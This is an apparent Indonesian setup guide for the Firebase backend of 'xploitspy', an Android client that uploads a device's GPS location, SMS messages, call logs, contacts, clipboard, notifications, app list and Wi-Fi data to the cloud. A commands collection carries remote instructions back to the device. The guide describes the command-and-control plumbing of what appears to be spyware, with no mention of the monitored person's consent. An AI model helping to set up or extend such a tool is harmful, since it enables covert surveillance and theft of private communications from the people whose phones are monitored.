# Setup Firebase untuk Monitoring Cross-Network

## Konsep

Dengan Firebase, device Android bisa mengirim data ke Firebase dari jaringan manapun, dan server bisa membaca data dari Firebase. Ini memungkinkan monitoring tanpa harus dalam jaringan yang sama.

## Arsitektur

```
Android Device (Jaringan A)
    ↓
Firebase Firestore (Cloud)
    ↓
Server (Jaringan B)
```

## Langkah Setup

### 1. Buat Firebase Project

1. Buka https://console.firebase.google.com/
2. Klik "Add project"
3. Masukkan nama project: `xploitspy` (atau nama lain)
4. Enable Google Analytics (opsional)
5. Create project

### 2. Setup Firestore Database

1. Di Firebase Console, pilih "Firestore Database"
2. Klik "Create database"
3. Pilih "Start in test mode" (untuk development)
4. Pilih location (pilih yang terdekat)
5. Enable

### 3. Setup Android App di Firebase

1. Di Firebase Console, klik ikon Android
2. Package name: `com.xploitspy.client`
3. Download `google-services.json`
4. Copy file ke: `client/app/google-services.json`

### 4. Setup Server (Node.js)

1. Di Firebase Console, Project Settings → Service Accounts
2. Generate new private key
3. Download JSON file
4. Simpan sebagai `server/firebase-service-account.json`

## Struktur Data di Firestore

```
/devices/{deviceId}/
  - deviceInfo: { deviceName, androidVersion, lastSeen }
  - gps_logs/{timestamp}: { latitude, longitude, accuracy, altitude }
  - sms_logs/{timestamp}: { phoneNumber, message, type }
  - call_logs/{timestamp}: { phoneNumber, callType, duration }
  - contacts/{contactId}: { name, phoneNumber, email }
  - apps/{appId}: { name, packageName, version }
  - clipboard/{timestamp}: { content }
  - notifications/{timestamp}: { appName, title, content }
  - wifi/{timestamp}: { networks: [...] }
  - commands/{commandId}: { command, parameters, status, result }
```

## Keuntungan

✅ Device bisa di-monitoring dari jaringan manapun
✅ Real-time sync via Firestore
✅ Scalable (bisa handle banyak device)
✅ Reliable (Firebase handle connection issues)
✅ Secure (Firebase authentication & rules)

## Catatan Keamanan

⚠️ **PENTING**: Setup Firestore Security Rules untuk production!

